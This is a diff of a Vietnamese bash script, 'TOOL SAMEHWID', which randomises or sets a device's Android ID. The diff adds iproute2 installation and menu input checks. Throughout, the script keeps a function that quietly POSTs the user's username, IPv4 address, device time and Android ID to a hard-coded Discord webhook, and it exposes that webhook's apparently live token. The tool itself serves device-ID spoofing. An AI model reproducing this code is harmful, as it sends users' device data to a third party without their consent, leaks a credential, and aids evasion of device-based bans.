@@ -1,5 +1,18 @@
 #!/bin/bash
 
+# Tự động cài đặt gói iproute2 nếu chưa có
+if ! command -v ip &>/dev/null; then
+    echo "Đang kiểm tra và cài đặt gói iproute2..."
+    apt update && apt install -y iproute2
+    if [ $? -ne 0 ]; then
+        echo "Không thể cài đặt iproute2. Vui lòng kiểm tra kết nối mạng và thử lại."
+        exit 1
+    fi
+    echo "Cài đặt iproute2 thành công!"
+else
+    echo "Gói iproute2 đã được cài đặt."
+fi
+
 # URL của webhook
 WEBHOOK_URL="https://discord.com/api/webhooks/1367492734524592218/VRVTq0l-ok9bsa_PFBmrti2tUHhDX9D2qx9y1YSaG3XG0iG4mKjvTEy23zChpVpJxyuX"
 
@@ -22,38 +35,26 @@ replace_android_id_with_user_input() {
     fi
 }
 
-# Hàm kiểm tra root
-check_root_status() {
-    if [ "$EUID" -ne 0 ]; then
-        root_status="Thiết bị chưa root"
-    else
-        root_status="Thiết bị đã root"
-    fi
-    echo "$root_status"
-}
-
 # Hàm gửi thông tin qua webhook
 send_to_webhook() {
     local android_id="$1"
     local current_time=$(date)
     local ipv4=$(ip -4 addr show wlan0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo "Không tìm thấy IPv4")
-    local root_status=$(check_root_status)
 
     echo "Đang gửi thông tin qua webhook..."
     curl -X POST -H "Content-Type: application/json" -d '{
         "username": "'"$(whoami)"'",
         "device_time": "'"$current_time"'",
         "ipv4": "'"$ipv4"'",
-        "android_id": "'"$android_id"'",
-        "root_status": "'"$root_status"'"
+        "android_id": "'"$android_id"'"
     }' $WEBHOOK_URL
-    echo "Chờ phản Hồi"
+    echo "Thông tin đã được gửi!"
 }
 
 # Hiển thị menu
 show_menu() {
     echo "============================"
-    echo "  TOOL SAMEHWID (CodeX)    "
+    echo "  TOOL SAMEHWID (Đơn giản) "
     echo "============================"
     echo "1. Tạo Android ID ngẫu nhiên"
     echo "2. Thay đổi Android ID theo input"
@@ -63,10 +64,16 @@ show_menu() {
 
 # Hàm chính
 main() {
-    clear
     while true; do
         show_menu
         read -p "Chọn một tùy chọn (1-3): " choice
+
+        # Kiểm tra nếu người dùng nhập ký tự hoặc số không hợp lệ
+        if ! [[ "$choice" =~ ^[1-3]$ ]]; then
+            echo "Lựa chọn không hợp lệ! Vui lòng chọn lại."
+            sleep 1  # Thêm thời gian chờ để tránh lặp nhanh
+            continue
+        fi
 
         case $choice in
             1)
@@ -79,12 +86,10 @@ main() {
                 echo "Thoát. Tạm biệt!"
                 exit 0
                 ;;
-            *)
-                echo "Lựa chọn không hợp lệ! Vui lòng chọn lại."
-                ;;
         esac
+
+        # Thêm thời gian chờ trước khi làm mới menu
         read -p "Nhấn Enter để tiếp tục..."
-        clear
     done
 }
 
